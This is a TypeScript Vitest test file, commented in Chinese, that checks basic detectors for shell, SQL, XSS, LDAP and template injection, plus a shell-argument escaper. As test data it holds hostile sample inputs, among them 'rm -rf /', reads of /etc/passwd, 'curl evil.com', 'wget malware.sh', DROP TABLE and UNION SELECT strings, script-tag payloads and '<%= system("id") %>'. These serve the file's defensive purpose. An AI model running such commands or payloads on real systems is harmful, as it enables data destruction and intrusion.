import { describe, it, expect } from 'vitest';

describe('命令注入防护', () => {
  const dangerousShellChars = [
    '|',
    '&',
    ';',
    '$',
    '`',
    '(',
    ')',
    '{',
    '}',
    '<',
    '>',
    '\n',
    '\r',
  ];

  const containsDangerousChars = (input: string): boolean => {
    return dangerousShellChars.some((char) => input.includes(char));
  };

  const escapeShellArg = (arg: string): string => {
    return `'${arg.replace(/'/g, "'\\''")}'`;
  };

  describe('Shell 命令注入检测', () => {
    it('应该检测管道注入', () => {
      const maliciousInputs = [
        'file.txt | cat /etc/passwd',
        'test; rm -rf /',
        'input && curl evil.com',
        'data || wget malware.sh',
      ];

      for (const input of maliciousInputs) {
        expect(containsDangerousChars(input)).toBe(true);
      }
    });

    it('应该检测命令替换', () => {
      const maliciousInputs = [
        '$(whoami)',
        '`id`',
        '${PATH}',
        'file$(cat /etc/passwd).txt',
      ];

      for (const input of maliciousInputs) {
        expect(containsDangerousChars(input)).toBe(true);
      }
    });

    it('应该检测换行注入', () => {
      const maliciousInputs = ['file.txt\nrm -rf /', 'input\r\nmalicious'];

      for (const input of maliciousInputs) {
        expect(containsDangerousChars(input)).toBe(true);
      }
    });

    it('应该允许安全的输入', () => {
      const safeInputs = [
        'file.txt',
        'my-project',
        'src/index.ts',
        'hello world',
        'test_file_123',
      ];

      for (const input of safeInputs) {
        expect(containsDangerousChars(input)).toBe(false);
      }
    });
  });

  describe('参数转义', () => {
    it('应该正确转义单引号', () => {
      expect(escapeShellArg("it's")).toBe("'it'\\''s'");
      expect(escapeShellArg("test'test")).toBe("'test'\\''test'");
    });

    it('应该转义危险字符', () => {
      const dangerous = 'file; rm -rf /';
      const escaped = escapeShellArg(dangerous);
      expect(escaped).toBe("'file; rm -rf /'");
    });
  });

  describe('SQL 注入检测', () => {
    const sqlInjectionPatterns = [
      /'\s*OR\s+'?1'?\s*=\s*'?1/i,
      /'\s*OR\s+'?'?\s*=\s*'?/i,
      /;\s*DROP\s+TABLE/i,
      /;\s*DELETE\s+FROM/i,
      /UNION\s+SELECT/i,
      /--\s*$/,
      /\/\*.*\*\//,
    ];

    const containsSQLInjection = (input: string): boolean => {
      return sqlInjectionPatterns.some((pattern) => pattern.test(input));
    };

    it('应该检测经典 SQL 注入', () => {
      const maliciousInputs = [
        "' OR '1'='1",
        "' OR ''='",
        "admin'--",
        "'; DROP TABLE users;--",
        '1; DELETE FROM users',
        "' UNION SELECT * FROM passwords--",
      ];

      for (const input of maliciousInputs) {
        expect(containsSQLInjection(input)).toBe(true);
      }
    });

    it('应该允许正常输入', () => {
      const safeInputs = ['john_doe', 'user@example.com', 'My Project Name', '12345'];

      for (const input of safeInputs) {
        expect(containsSQLInjection(input)).toBe(false);
      }
    });
  });

  describe('XSS 注入检测', () => {
    const xssPatterns = [
      /<script\b[^>]*>/i,
      /<\/script>/i,
      /javascript:/i,
      /on\w+\s*=/i,
      /<iframe\b/i,
      /<object\b/i,
      /<embed\b/i,
      /<svg\b[^>]*onload/i,
    ];

    const containsXSS = (input: string): boolean => {
      return xssPatterns.some((pattern) => pattern.test(input));
    };

    it('应该检测 script 标签', () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        '<SCRIPT SRC="evil.js"></SCRIPT>',
        '<script type="text/javascript">',
      ];

      for (const input of maliciousInputs) {
        expect(containsXSS(input)).toBe(true);
      }
    });

    it('应该检测事件处理器', () => {
      const maliciousInputs = [
        '<img onerror="alert(1)">',
        '<body onload="malicious()">',
        '<div onclick="steal()">',
      ];

      for (const input of maliciousInputs) {
        expect(containsXSS(input)).toBe(true);
      }
    });

    it('应该检测 javascript: 协议', () => {
      const maliciousInputs = ['javascript:alert(1)', '<a href="javascript:void(0)">'];

      for (const input of maliciousInputs) {
        expect(containsXSS(input)).toBe(true);
      }
    });

    it('应该允许正常 HTML', () => {
      const safeInputs = [
        '<p>Hello World</p>',
        '<div class="container">',
        '<a href="https://example.com">Link</a>',
      ];

      for (const input of safeInputs) {
        expect(containsXSS(input)).toBe(false);
      }
    });
  });

  describe('LDAP 注入检测', () => {
    const ldapInjectionChars = ['*', '(', ')', '\\', '\x00'];

    const containsLDAPInjection = (input: string): boolean => {
      return ldapInjectionChars.some((char) => input.includes(char));
    };

    it('应该检测 LDAP 特殊字符', () => {
      const maliciousInputs = ['*)(uid=*))(|(uid=*', 'admin)(|(password=*)', '\\00'];

      for (const input of maliciousInputs) {
        expect(containsLDAPInjection(input)).toBe(true);
      }
    });
  });

  describe('模板注入检测', () => {
    const templateInjectionPatterns = [/\{\{.*\}\}/, /\$\{.*\}/, /<%.*%>/, /#\{.*\}/];

    const containsTemplateInjection = (input: string): boolean => {
      return templateInjectionPatterns.some((pattern) => pattern.test(input));
    };

    it('应该检测模板语法', () => {
      const maliciousInputs = [
        '{{constructor.constructor("return this")()}}',
        '${7*7}',
        '<%= system("id") %>',
        '#{7*7}',
      ];

      for (const input of maliciousInputs) {
        expect(containsTemplateInjection(input)).toBe(true);
      }
    });

    it('应该允许正常文本', () => {
      const safeInputs = ['Hello World', 'user@example.com', 'My Project'];

      for (const input of safeInputs) {
        expect(containsTemplateInjection(input)).toBe(false);
      }
    });
  });
});
